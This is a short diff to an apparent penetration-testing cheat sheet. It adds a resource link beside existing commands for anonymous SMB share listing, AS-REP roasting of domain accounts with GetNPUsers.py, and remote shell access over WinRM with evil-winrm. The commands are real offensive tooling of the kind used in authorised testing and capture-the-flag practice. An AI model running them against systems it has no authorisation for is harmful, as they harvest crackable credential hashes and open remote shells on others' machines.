@@ -44,6 +44,9 @@ smbcacls -N '//IP/Sub' /Users
 GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
 GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist
 ```
+resources:
+
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 ### [Windows Remote Management WinRM p5985]
 ```
 ruby evil-winrm.rb -i IP -u username -p 'password' -s '/path/to/scripts/' -e '/path/to/exes/'
